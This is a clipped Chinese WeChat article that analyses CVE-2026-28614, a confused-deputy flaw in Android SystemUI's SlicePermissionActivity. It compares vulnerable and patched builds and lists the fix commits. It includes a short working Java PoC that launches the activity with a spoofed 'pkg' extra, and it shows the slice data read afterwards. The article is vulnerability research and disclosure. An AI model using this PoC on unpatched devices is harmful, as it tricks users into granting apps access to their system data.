---
title: 【微信】恶意 App 如何让安卓系统替自己“开绿灯”？
source: https://mp.weixin.qq.com/s/BDJU4pbuCfr-EnQe61D32Q
source_host: mp.weixin.qq.com
clip_date: 2026-09-11T13:57:48+08:00
trace_id: c8ee91df-d165-48a5-b830-697a718efb34
content_hash: d97bf1e7a1193119e90c00b7d0e119a553c3f5cbdd9e242b87aa02c94b075106
status: synced
tags:
  - 微信
  - Android逆向
  - 漏洞分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: CVE-2026-28614：SystemUI 的 `SlicePermissionActivity` 直接采信 Intent 中的 `pkg` Extra，任意应用可伪造调用方身份，诱骗用户点击后获得系统级 Slice 授权。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3d875244-d011-8165-8f6b-e822c90f3dc7
ioc:
  cves:
    - CVE-2026-28614
  cwes: []
  hashes:
    - 216464c8bcb7a2f60604cc6fd0f968639f5e891f
    - 390eefdff00b5ec4ecd669dfcd975b82f772e6df
    - 7f44449562bc0a09e52ec84b37d95733c823e72d
    - 90e563165474eb865ba3aecd54e71a0c445966c0
    - dbcba0975474be9589ee5ed4b809b5eb052e6468
    - ec1b85f5159017b25a3c1353441f0dbae04623bc
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> CVE-2026-28614：SystemUI 的 `SlicePermissionActivity` 直接采信 Intent 中的 `pkg` Extra，任意应用可伪造调用方身份，诱骗用户点击后获得系统级 Slice 授权。
> 
> - **根因：** `onCreate` 中 `mCallingPkg` 取自 `getIntent().getStringExtra("pkg")`，该 Activity 为 exported 且无权限保护，构成 Confused Deputy；`provider_pkg` 校验仅写 EventLog 不阻断。
> - **补丁对照：** 修复版新增 `isCallerValid()`，改用 Binder 层的 `getLaunchedFromPackage()`（或 `getCallingPackage()`）校验，仅允许 Provider 自身或 `android` 进程，校验失败立即 `finish()`；修复 SPL 为 2026-09-01。
> - **影响范围：** Android 14–17 且 SPL < 2026-09-01 的设备；无需权限、仅需一次点击，授权写入 `/data/system/slice/client_<pkg>@0` 且 `fullAccess="1"` 永久生效。
> - **可读数据：** 可绑定 `com.android.systemui.keyguard`（锁屏日期、闹钟、媒体）与 `android.settings.slices`（Wi-Fi 状态整数、标题、搜索关键词）；Settings 类 Slice 需 `pinSlice` 才能拿到完整内容。
> - **局限：** 非 RCE，Slice 为只读共享，弹窗无法静默绕过，且部分设备已移除 Slice Provider。

**大山子雪人** *2026年9月11日 12:31*

## ASB-A-486385459 漏洞分析报告

**CVE**: CVE-2026-28614  
**日期**: 2026-09-11  
**严重级别**: High  
**类型**: EoP（本地权限提升）— Confused Deputy  
**补丁 SPL**: 2026-09-01

* * *

## 一、漏洞概述

### 基本信息

| 字段  | 内容  |
| --- | --- |
| 漏洞 ID | ASB-A-486385459 / CVE-2026-28614 |
| 受影响组件 | `platform/frameworks/base`<br><br>→ SystemUI |
| 受影响文件 | `packages/SystemUI/src/com/android/systemui/SlicePermissionActivity.java` |
| 受影响版本 | Android 14 / 15 / 16 / 16-qpr2 / 17 / 17-next |
| 漏洞类型 | Confused Deputy → 本地权限提升 |
| 用户交互 | 需要（用户点击弹窗一次） |
| 额外权限 | 无需  |

### 漏洞描述

`SlicePermissionActivity` 的 `onCreate` 方法中， `mCallingPkg` （调用方包名）直接取自 Intent Extra，未经身份验证。由于该 Activity 是 `exported` 且无权限保护，任意应用可直接启动并伪造调用方身份，令 SystemUI 以系统权限为攻击者控制的包授予 Slice 内容权限，构成"混淆代理人"（Confused Deputy）攻击。

* * *

## 二、ROM 漏洞状态分析

### 2.1 测试环境

分析对象为 `cubs-ota` 系列两个 OTA 包：

| ROM | 文件名 | 构建日期 | Android | SPL |
| --- | --- | --- | --- | --- |
| cubs_a | `cubs-ota-cd1a.260714.001.a9-4834ee9d.zip` | 17  |
| cubs_b | `cubs-ota-cd1a.260905.001.b1-2c1865b8.zip` | 17  |

### 2.2 分析方法

```
OTA zip
  └─ payload-dumper-go → system.img / system_ext.img (erofs)
       └─ fsck.erofs --extract → 文件系统目录
            └─ priv-app/SystemUIGoogle/SystemUIGoogle.apk
                 └─ 原始字节解析 dex → jadx --single-class
                      └─ SlicePermissionActivity.java
```

### 2.3 漏洞状态对比

```kotlin
// SlicePermissionActivity.java — onCreate
this.mCallingPkg = getIntent().getStringExtra("pkg");  // ← 直接信任 Intent Extra，未校验

// ... EventLog 记录但不阻断 ...

// 以伪造的 mCallingPkg 加载应用标签展示给用户
String unicodeWrap = packageManager
    .getApplicationInfo(this.mCallingPkg, 0)   // 攻击者控制的值
    .loadSafeLabel(...).toString();

// onClick 中：向攻击者指定的包授权
grantPermissionFromUser(this.mUri, this.mCallingPkg, ...);
```

新增方法 `isCallerValid()` ，通过 Binder 层 API 验证真实调用方身份：

```kotlin
public final boolean isCallerValid() {
    // getLaunchedFromPackage() 来自 Activity Manager Binder 记录，无法通过 Intent Extra 伪造
    String launchedFromPackage = getLaunchedFromPackage();
    if (launchedFromPackage == null) {
        launchedFromPackage = getCallingPackage();  // 备用
    }
    // 仅允许 Provider 自身或系统进程发起
    if (launchedFromPackage != null && (
            launchedFromPackage.equals(this.mProviderPkg) ||
            launchedFromPackage.equals(getPackageName()) ||
            "android".equals(launchedFromPackage))) {
        return true;
    }
    Log.e("SlicePermissionActivity",
        "Direct launch blocked. Expected provider " + this.mProviderPkg +
        " or system, but got " + launchedFromPackage);
    return false;
}
```

在 `onCreate` 中注入拦截点（EventLog 之后、UI 展示之前）：

```
if (!isCallerValid()) {
    finish();   // ← 非法调用直接终止
    return;
}
```

### 2.4 补丁有效性对比

| 检查点 | cubs_a（漏洞） | cubs_b（已修复） |
| --- | --- | --- |
| `isCallerValid()`<br><br>方法 | **不存在** | **存在** |
| `getLaunchedFromPackage()`<br><br>调用 | 无   | 有，用于 Binder 级身份验证 |
| `onCreate`<br><br>中 `finish()` 拦截 | 无   | 有，校验失败立即终止 |
| 日志行为 | 仅 `EventLog.writeEvent` （不阻断） | `Log.e`<br><br>\+ `finish()` （阻断） |
| retrace hash | `cf4445cd...` | `80c4f309...` |

* * *

## 三、漏洞原理深度分析

### 3.1 Confused Deputy 攻击模型

正常流程中，Slice 权限弹窗仅应由 Slice Content Provider 通过 `PendingIntent` 触发：

```
正常流程:
  Launcher (需要访问 Slice)
      │ bindSlice(uri)
      ▼
  SliceProvider (com.android.settings)
      │ 主动创建 PendingIntent → 触发 SlicePermissionActivity
      ▼
  SlicePermissionActivity (SystemUI)
      │ 验证: 来自 Provider 本身，合法
      ▼
  grantPermissionFromUser(uri, callingPkg, ...)
```

攻击流程（利用漏洞）：

```css
攻击流程:
  恶意 App (com.evil)
      │ startActivity(Intent)
      │   action  = com.android.intent.action.REQUEST_SLICE_PERMISSION
      │   pkg     = "com.example.slicepoc"   ← 伪造为自身或任意包名
      │   slice_uri= content://victim.provider/...
      ▼
  SlicePermissionActivity (SystemUI 进程，持有系统权限)
      │ mCallingPkg = getIntent().getStringExtra("pkg")
      │             = "com.example.slicepoc"  ← 直接采信，无任何验证
      │
      │ 弹窗: "Allow SlicePoc to show [Provider] slices?"
      │ （用户看到的是攻击者控制的包名，对应合理的显示名称）
      ▼
  用户点击 ALLOW
      ▼
  grantPermissionFromUser(uri, "com.example.slicepoc", permanent=true)
      ← SystemUI 作为"混淆代理人"完成了授权
```

### 3.2 现有防御措施的不足

漏洞代码中存在 `provider_pkg` 校验逻辑，但仅记录日志， **不阻断执行**：

```javascript
String stringExtra = getIntent().getStringExtra("provider_pkg");
if (stringExtra != null && !this.mProviderPkg.equals(stringExtra)) {
    // ↓ 只写 EventLog，继续执行，弹窗照常展示
    EventLog.writeEvent(1397638484, "159145361", Integer.valueOf(i));
}
// ← 没有 return，没有 finish()
```

### 3.3 授权后攻击面

| Slice Authority | 可读取内容 | 敏感度 |
| --- | --- | --- |
| `com.android.systemui.keyguard` | 锁屏日期、下个闹钟时间、媒体信息 | 中   |
| `com.android.settings.slices` | Wi-Fi 名称、蓝牙状态、飞行模式、位置开关等系统设置当前值及关键词 | 中高  |
| `android.settings.slices` | 同上，含完整文本内容（标题、摘要、关键词） | 高   |
| 第三方应用 Slice | 取决于应用实现 | 不定  |

* * *

## 四、PoC 验证

### 4.1 测试环境

-   • 设备：Android 模拟器（emulator-5554）
    
-   • Android 版本：15（SPL 2024-09-05）
    
-   • 漏洞状态： `isCallerValid()` 不存在， **可利用**
    

### 4.2 PoC 应用核心代码

```java
private void launchExploit() {
    Uri sliceUri = Uri.parse("content://com.android.systemui.keyguard/main");

    Intent intent = new Intent("com.android.intent.action.REQUEST_SLICE_PERMISSION");
    intent.setComponent(new ComponentName(
            "com.android.systemui",
            "com.android.systemui.SlicePermissionActivity"));

    // Confused Deputy: 伪造调用方身份
    intent.putExtra("slice_uri", sliceUri);
    intent.putExtra("pkg", getPackageName());          // ← 指向自身（攻击者）
    intent.putExtra("provider_pkg", "com.android.systemui");

    startActivity(intent);
}
```

### 4.3 验证截图时间线

**Step 1：初始状态（权限未授予）**

```
[checkSlicePermission]
  com.android.systemui.keyguard: DENIED ✗
  com.android.settings.slices:   DENIED ✗
[已授权 Slice]
  (空)
```

**Step 2：触发弹窗**

弹窗由 SystemUI 进程弹出，显示：

> **Allow SlicePoc to show System UI slices?**
> 
> -   • It can take actions inside System UI
>     
> -   • It can read information from System UI  
>     ☐ Allow SlicePoc to show slices from any app
>     

`SlicePermissionActivity` 成功被直接启动（ActivityTaskManager 日志确认）：

```
I ActivityTaskManager: START u0 {act=com.android.intent.action.REQUEST_SLICE_PERMISSION
  cmp=com.android.systemui/.SlicePermissionActivity} with LAUNCH_MULTIPLE from uid 10151
```

**Step 3：用户点击 ALLOW — 权限持久化写入**

系统在 `/data/system/slice/` 写入权限记录：

```html
<!-- /data/system/slice/client_com.example.slicepoc@0 -->
<client pkg="com.example.slicepoc@0" fullAccess="1">
  <authority authority="com.android.systemui.keyguard"
             pkg="com.android.systemui@0">
    <path></path>
  </authority>
</client>
```

`fullAccess="1"` = 对该 authority 下 **所有路径** 永久授权。

**Step 4：授权后状态**

```
[checkSlicePermission]
  com.android.systemui.keyguard: GRANTED ✓   ← 漏洞利用成功
  com.android.settings.slices:   GRANTED ✓
```

### 4.4 数据读取验证（bindSlice）

利用 `SliceManager.bindSlice()` API 实际读取到各 Provider 数据：

```bash
[bindSlice 结果]
  ✓ systemui.keyguard/main:
      Fri, Sep 11                          ← 锁屏日期
  ✓ systemui.keyguard/next_alarm:
      Fri, Sep 11                          ← 下个闹钟
  ✓ systemui.keyguard/media:
      Fri, Sep 11
  ✓ settings.slices/action/wifi:           ← [partial] 标志，需 pin 后完整加载
      (no text items, hints=[partial])
  ✓ settings.slices/action/bluetooth:
      (no text items, hints=[partial])
  ✓ settings.slices/action/airplane_mode:
      (no text items, hints=[partial])
  ✓ settings.slices/action/battery_saver:
      (no text items, hints=[partial])
  ✓ settings.slices/action/location:
      (no text items, hints=[partial])
  ✓ settings.slices/action/nfc:
      (no text items, hints=[partial])
  ✓ android.settings.slices/action/wifi:
      [int:-1] Wi‑Fi | wifi | wi-fi | data | network connection | wireless | wi fi | internet |
                ↑ 开关状态整数    ↑ 完整文本内容及搜索关键词
```

`android.settings.slices` authority 返回了完整的 Wi-Fi 设置项信息，包括：

-   • 当前状态整数值（ `int:-1` 表示开启）
    
-   • 显示标题（ `Wi‑Fi` ）
    
-   • 搜索关键词列表（ `wifi | wi-fi | data | network connection | wireless | internet` ）
    

* * *

## 五、影响评估

### 5.1 可利用性

| 条件  | 评估  |
| --- | --- |
| 所需权限 | 无（普通 App 即可） |
| 用户交互 | 需要一次点击（弹窗） |
| 欺骗难度 | 中等（弹窗显示攻击者 App 名称，无明显异常） |
| 利用稳定性 | 高（直接调用导出组件，无竞争条件） |
| 持久性 | 永久（写入 `/data/system/slice/` ，重启后保留） |

### 5.2 局限性

-   • **非 RCE**：Slice API 为只读内容共享，无法执行代码或写入数据
    
-   • **需要一次用户交互**：弹窗无法静默绕过
    
-   • **Slice API 部分弃用**：Android 10+ 起部分应用已移除 Slice Provider，可读数据因设备而异
    
-   • **Settings Slice 需 pin 后完整加载**： `hints=[partial]` 表示需先通过 `pinSlice` 注册才能获取完整数据
    

### 5.3 受影响范围

所有 SPL < 2026-09-01、Android 14–17 的设备均受影响，包括本次分析的：

-   • `stallion-ota-cp2a.260805.005.a1` （SPL 2026-08-05）— **受影响**
    
-   • `stallion-ota-cp2a.260805.005` （SPL 2026-08-05）— **受影响**
    
-   • `cubs-ota-cd1a.260714.001.a9` （SPL 2026-08-05）— **受影响**
    
-   • `cubs-ota-cd1a.260905.001.b1` （SPL 2026-09-01）— **已修复**
    

* * *

## 六、修复建议

### 官方补丁

升级至 SPL ≥ 2026-09-01。各 Android 版本对应 commit：

| 分支  | Commit |
| --- | --- |
| Android 14 | `ec1b85f5159017b25a3c1353441f0dbae04623bc` |
| Android 15 | `90e563165474eb865ba3aecd54e71a0c445966c0` |
| Android 16 | `390eefdff00b5ec4ecd669dfcd975b82f772e6df` |
| Android 16-qpr2 | `216464c8bcb7a2f60604cc6fd0f968639f5e891f` |
| Android 17 | `dbcba0975474be9589ee5ed4b809b5eb052e6468` |
| Android 17-next | `7f44449562bc0a09e52ec84b37d95733c823e72d` |

### 修复核心逻辑

在 `onCreate` 调用 `verifyCallingPkg()` 之后、展示 UI 之前，通过 Binder 层 API 验证真实调用方：

```javascript
// 使用 getLaunchedFromPackage() 或 getCallingPackage()
// 这两个 API 从 Activity Manager Binder 记录中读取，无法通过 Intent Extra 伪造
String actualCaller = getLaunchedFromPackage();
if (actualCaller == null) actualCaller = getCallingPackage();

if (!mProviderPkg.equals(actualCaller)
        && !getPackageName().equals(actualCaller)
        && !"android".equals(actualCaller)) {
    finish();  // 拒绝非合法调用方
    return;
}
```

* * *

## 七、附录：关键文件

| 文件  | 说明  |
| --- | --- |
| `/data/system/slice/client_<pkg>@0` | 客户端 Slice 权限记录（XML） |
| `/data/system/slice/provider_<pkg>@0` | Provider 侧授权记录（XML） |
| `packages/SystemUI/src/com/android/systemui/SlicePermissionActivity.java` | 漏洞所在文件 |
| `content://com.android.systemui.keyguard/main` | 锁屏 Slice URI |
| `content://android.settings.slices/action/wifi` | Settings Wi-Fi Slice URI（可读取完整文本） |

android系统 · 目录
